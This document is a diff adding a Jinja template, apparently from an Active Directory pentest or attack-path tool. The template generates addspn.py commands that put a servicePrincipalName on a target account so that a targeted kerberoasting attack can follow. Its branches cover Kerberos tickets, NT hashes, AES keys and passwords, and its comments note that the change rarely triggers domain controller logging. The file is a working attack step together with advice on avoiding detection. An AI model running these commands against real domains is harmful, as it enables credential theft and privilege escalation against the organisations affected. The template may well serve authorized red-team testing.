@@ -1,0 +1,13 @@
+# Set an SPN on {{target.name}} to perform a kerberoasting attack (the SPN must be unique!)
+# Modifying the servicePrincipalName attribute will not, by default, generate an event
+# on the Domain Controller. Your target may have configured logging on users to generate
+# 5136 events whenever a directory service is modified, but this configuration is very rare.
+{% if parent.krb_auth %}
+./tools/addspn.py '{{fqdn}}/{{parent.obj.name}}@{{dc_name}}' -use-ldaps -dc-ip {{dc_ip}} -k -t '{{target.name}}' -add '{{spn}}'
+{%- elif parent.secret_type == T_SECRET_NTHASH %}
+./tools/addspn.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -hashes :{{parent.secret|red}} -t '{{target.name}}' -add '{{spn}}'
+{%- elif parent.secret_type == T_SECRET_AESKEY %}
+./tools/addspn.py '{{fqdn}}/{{parent.obj.name}}@{{dc_ip}}' -use-ldaps -k -aesKey {{parent.secret|red}} -t '{{target.name}}' -add '{{spn}}'
+{%- elif parent.secret_type == T_SECRET_PASSWORD %}
+./tools/addspn.py '{{fqdn}}/{{parent.obj.name}}:{{parent.secret|red}}@{{dc_ip}}' -use-ldaps -t '{{target.name}}' -add '{{spn}}'
+{%- endif %}
